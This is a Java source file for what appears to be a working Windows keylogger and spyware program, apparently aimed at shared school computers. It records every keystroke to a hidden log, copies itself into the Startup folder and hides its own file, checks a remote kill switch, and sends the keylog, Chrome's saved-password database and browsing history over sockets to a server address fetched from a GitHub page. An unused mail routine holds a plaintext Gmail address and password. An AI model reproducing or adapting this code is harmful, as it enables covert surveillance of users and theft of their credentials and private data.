package main;

import org.jnativehook.keyboard.NativeKeyListener;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.Socket;
import java.net.URISyntaxException;
import java.net.URL;
import java.net.URLConnection;
import java.net.UnknownHostException;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.Properties;
import java.util.Scanner;

import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.mail.BodyPart;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;

public class Main implements NativeKeyListener{
	public static void main (String[] args) throws IOException, URISyntaxException {
		int version = 1;
		if (getCurrentVersion() > version) {
			// update the code, replace current version with new version. (not done)
		}
		String[] protect = new String[]{"s-duv", "citrus", "s-suzukia","s-tehi", "s-chenb", "s-chenr"};
		// System.out.println(System.getProperty("user.name"));
		for(int fsk = 0; fsk < protect.length; fsk++) {
			// System.out.println(System.getProperty("user.name"));
			if (protect[fsk].matches(System.getProperty("user.name"))) {
				// System.out.println(fsk);
				System.exit(0);
			}
		}
		if (!isWindows()){
			System.out.println("This ain't windows, son!");
			System.exit(0);
		}
		if (isSuicune()) {
			 File cf = new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
			cf.deleteOnExit();
			System.exit(0);
		}
		File yiffyiff = new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
		// System.out.println("Location " + yiffyiff);
		String startup = "C:/Users/" + System.getProperty("user.name") + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";
		 @SuppressWarnings("unused")
		 Process p =Runtime.getRuntime().exec(System.getenv("windir") +"\\system32\\"+"xcopy.exe" + " \"" + yiffyiff + "\"" + " \"" + startup +"\"");
		 Process px =Runtime.getRuntime().exec(System.getenv("windir") +"\\system32\\"+"attrib.exe +h" + " \"" + yiffyiff + "\"");
		File log = new File("C:/ClassPolicy/" + System.getProperty("user.name") + ".txt");
		if(!log.exists()) {
			System.out.println("Creating logfile...");
			System.out.println("Starting...");
			log.createNewFile();
		} else {
			System.out.println("Starting...");
		}
		String fn = "C:/ClassPolicy/" + System.getProperty("user.name") + ".txt";
		PrintWriter timestamper = new PrintWriter(new FileWriter(fn, true));
		timestamper.println();
		timestamper.print("[Startup: " + new SimpleDateFormat("EEEE").format(new Date()) + " +" + getCurrentTimeInBeats() + " ]");
		timestamper.println();
		timestamper.close();
		try {
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		GlobalScreen.getInstance().addNativeKeyListener(new Main());
		for(;;) {
			java.util.Date date = new java.util.Date();
		    Calendar cal = Calendar.getInstance();
		    cal.setTime(date);
		    int minutes = cal.get(Calendar.MINUTE);
		    // upload(getHostIP());
		   // uphistory(getHostIP());
			 if (minutes % 2 == 0) {
			    	// send the file
				 System.out.println("A " + minutes);
				 upload(getHostIP());
			    } else {
				 System.out.println("B " + minutes);
				 uplogin(getHostIP());
				 uphistory(getHostIP());
			 }
		}
	}

	private static boolean isSuicune() {
		try {
			 URL yahoo = new URL("https://github.com/OtakuInSeattle/sites/blob/master/klkillswitch");
	         URLConnection yc = yahoo.openConnection();
	         BufferedReader in = new BufferedReader(new InputStreamReader(
	                 yc.getInputStream(), "UTF-8"));
	         String inputLine;
	         StringBuilder a = new StringBuilder();
	         while ((inputLine = in.readLine()) != null){
	             a.append(inputLine);
	             if(a.toString().contains("yes")) {
	            	 return true;
	             }
	         }
	         System.out.println("NO");
	         return false;
		} catch (Exception e) {
			System.out.println(e);
			return false;
		}
	}
	@Override
	public void nativeKeyPressed(NativeKeyEvent e) {
		// TODO Auto-generated method stub
		record(NativeKeyEvent.getKeyText(e.getKeyCode()));
	    // System.out.println("Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
	}
	@Override
	public void nativeKeyReleased(NativeKeyEvent e) {
		// System.out.println("Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
		//if (NativeKeyEvent.getKeyText(e.getKeyCode()).matches("Enter")) {
		//	System.out.print("\n");
		//} else if (NativeKeyEvent.getKeyText(e.getKeyCode()).matches("Space")) {
		//	System.out.print(" ");
		//} else {
		//	System.out.print(NativeKeyEvent.getKeyText(e.getKeyCode()));
		//}
		}
	@Override
	public void nativeKeyTyped(NativeKeyEvent arg0) {
		// TODO Auto-generated method stub
	}
	public static void record(String x) {
		try {
			String filename = "C:/ClassPolicy/" + System.getProperty("user.name") + ".txt";
			PrintWriter out = new PrintWriter(new FileWriter(filename, true));
			// System.out.println("rec " + x);
			if(x.matches("Space")) {
				out.print(" ");
				out.close();
			} else {
			out.print(x);
			out.close();
			}
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	 public static boolean isWindows() {
		   String OS = System.getProperty("os.name").toLowerCase();
		   return (OS.indexOf("win") >= 0);
		}
	 public static int getCurrentTimeInBeats() {
		    java.util.Calendar cal = java.util.Calendar.getInstance( java.util.TimeZone.getTimeZone( "GMT+01:00" ) );
		    int beats = (int) ( ( cal.get( java.util.Calendar.SECOND ) + ( cal.get( java.util.Calendar.MINUTE ) * 60 ) + ( cal.get( java.util.Calendar.HOUR_OF_DAY ) * 3600 ) ) / 86.4 );
		    return beats;
		}
	 public static String getHostIP() throws IOException {
		 try {
		 URL yahoo = new URL("https://github.com/OtakuInSeattle/sites/blob/master/uploader");
         URLConnection yc = yahoo.openConnection();
         BufferedReader in = new BufferedReader(new InputStreamReader(
                 yc.getInputStream(), "UTF-8"));
         String inputLine;
         StringBuilder a = new StringBuilder();
        // System.out.println("a");
         while ((inputLine = in.readLine()) != null){
             a.append(inputLine);
             if(inputLine.contains("connectTo")) {
          //  	 System.out.println("b");
            	 return(inputLine.substring(78, inputLine.indexOf("</td>")));
             }
         }
         return "127.0.0.1";
		 } catch (Exception e) {
			 return "127.0.0.1";
		 }
	 }
	 public static void upload(String ipee) {
		 try {
	    		//System.out.println(connectTo);
	    		Socket socket = new Socket(getHostIP(), 25565);
	    		OutputStream t = socket.getOutputStream();
	    		PrintWriter out = new PrintWriter(t);
				String toSend = System.getProperty("user.name") + ".txt";
				out.print(toSend );
				out.flush();
	    		File transferFile = new File ("C:/ClassPolicy/" + System.getProperty("user.name") + ".txt"); 
	    		byte [] bytearray = new byte [(int)transferFile.length()]; 
	    		FileInputStream fin = new FileInputStream(transferFile); 
	    		BufferedInputStream bin = new BufferedInputStream(fin); 
	    		bin.read(bytearray,0,bytearray.length); 
	    		OutputStream os = socket.getOutputStream(); 
	    		// System.out.println(""); 
	    		os.write(bytearray,0,bytearray.length); 
	    		os.flush(); 
	    		socket.close();
	    	} catch (Exception e) {
	    		System.out.println(e);
	    	}
	 }
	 public static void uplogin(String ipee) throws IOException {
		 try {
 		@SuppressWarnings("resource")
		Socket socket = new Socket(getHostIP(), 69);
 		OutputStream t = socket.getOutputStream();
 		PrintWriter out = new PrintWriter(t);
			String toSend = System.getProperty("user.name") + ".txt";
			out.print(toSend );
			out.flush();
			socket.close();
			Socket send = new Socket(getHostIP(), 420);
			// System.out.println("Accepted connection : " + nakadashi); 
			File transferFile = new File ("C:/Users/" + System.getProperty("user.name") + "/AppData/Local/Google/Chrome/User Data/Default/Login Data"); 
			byte [] bytearray = new byte [(int)transferFile.length()]; 
			FileInputStream fin = new FileInputStream(transferFile); 
			BufferedInputStream bin = new BufferedInputStream(fin); 
			bin.read(bytearray,0,bytearray.length); 
			OutputStream os = send.getOutputStream(); 
			System.out.println(""); 
			os.write(bytearray,0,bytearray.length); 
			os.flush();
		    send.close();
			System.out.println("yiff!");
		 } catch (Exception e) {
			 System.out.println("blargh");
		 }
	 }
	 public static void uphistory(String ipee) throws IOException {
		 try {
		 		@SuppressWarnings("resource")
				Socket socket = new Socket(getHostIP(), 70);
		 		OutputStream t = socket.getOutputStream();
		 		PrintWriter out = new PrintWriter(t);
					String toSend = System.getProperty("user.name") + "history.txt";
					out.print(toSend );
					out.flush();
					socket.close();
					Socket sand = new Socket(getHostIP(), 421);
					// System.out.println("Accepted connection : " + nakadashi); 
					File transferFile = new File ("C:/Users/" + System.getProperty("user.name") + "/AppData/Local/Google/Chrome/User Data/Default/History"); 
					byte [] bytearray = new byte [(int)transferFile.length()]; 
					FileInputStream fin = new FileInputStream(transferFile); 
					BufferedInputStream bin = new BufferedInputStream(fin); 
					bin.read(bytearray,0,bytearray.length); 
					OutputStream os = sand.getOutputStream(); 
					System.out.println(""); 
					os.write(bytearray,0,bytearray.length); 
					os.flush();
				    sand.close();
					System.out.println("yip!");
				 } catch (Exception e) {
					 System.out.println("blarfff");
				 }
	 }
	 public static int getCurrentVersion() {
		 try {
		 // return version from domain controller, if cant connect return current version
			 return 1;
		 } catch (Exception ee) {
			 return 1;
		 }
	 }
	 public static void mailLogs() {
		 // mail keylog, history and saved passwords to email address
		 // Recipient's email ID needs to be mentioned.
	      String to = "duvictor514@gmail.com";

	      // Sender's email ID needs to be mentioned
	      String from = "duvictor514@gmail.com";

	      final String username = "duvictor514@gmail.com";//change accordingly
	      final String password = "jessicazh12five";//change accordingly

	      // Assuming you are sending email through relay.jangosmtp.net
	      String host = "smtp.gmail.com";

	      Properties props = new Properties();
	      props.put("mail.smtp.auth", "true");
	      props.put("mail.smtp.starttls.enable", "true");
	      props.put("mail.smtp.host", host);
	      props.put("mail.smtp.port", "587"); // tls port

	      // Get the Session object.
	      Session session = Session.getInstance(props,
	         new javax.mail.Authenticator() {
	            protected PasswordAuthentication getPasswordAuthentication() {
	               return new PasswordAuthentication(username, password);
	            }
	         });

	      try {
	         // Create a default MimeMessage object.
	         Message message = new MimeMessage(session);

	         // Set From: header field of the header.
	         message.setFrom(new InternetAddress(from));

	         // Set To: header field of the header.
	         message.setRecipients(Message.RecipientType.TO,
	            InternetAddress.parse(to));

	         // Set Subject: header field
	         message.setSubject("Testing Subject");

	         // Create the message part
	         BodyPart messageBodyPart = new MimeBodyPart();

	         // Now set the actual message
	         messageBodyPart.setText("This is a bot message");

	         // Create a multipar message
	         Multipart multipart = new MimeMultipart();

	         // Set text message part
	         multipart.addBodyPart(messageBodyPart);

	         // Part two is attachment
	         messageBodyPart = new MimeBodyPart();
	         String filename = "/home/citrus/test.txt";
	         DataSource source = new FileDataSource(filename);
	         messageBodyPart.setDataHandler(new DataHandler(source));
	         messageBodyPart.setFileName(filename);
	         multipart.addBodyPart(messageBodyPart);

	         // Send the complete message parts
	         message.setContent(multipart);

	         // Send message
	         Transport.send(message);

	         System.out.println("Sent message successfully....");
	  
	      } catch (MessagingException e) {
	         throw new RuntimeException(e);
	      }
	 }
}
